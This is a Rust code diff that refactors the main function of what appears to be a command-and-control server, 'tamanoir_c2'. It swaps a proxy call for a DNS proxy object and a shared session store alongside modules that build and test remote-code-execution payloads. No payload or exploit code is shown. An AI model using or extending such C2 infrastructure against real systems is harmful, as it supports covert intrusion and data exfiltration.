@@ -2,8 +2,11 @@ use clap::Parser;
 use log::error;
 use tamanoir_c2::{
     cli::{Command, Opt, RceCommand},
-    handlers::rce::{builder::build, tester::test_bin},
-    serve_proxy, serve_tonic, TargetArch,
+    handlers::{
+        dns_proxy::DnsProxy,
+        rce::{builder::build, tester::test_bin},
+    },
+    serve_tonic, SessionsStore, TargetArch,
 };
 
 #[tokio::main]
@@ -56,7 +59,12 @@ async fn main() -> anyhow::Result<()> {
             dns_ip,
             payload_len,
         } => {
-            tokio::try_join!(serve_tonic(), serve_proxy(port, dns_ip, payload_len))?;
+            let dns_proxy = DnsProxy::new(port, dns_ip, payload_len);
+            let sessions_store = SessionsStore::new();
+            tokio::try_join!(
+                dns_proxy.serve(sessions_store.sessions.clone()),
+                serve_tonic(sessions_store)
+            )?;
         }
     }
     Ok(())
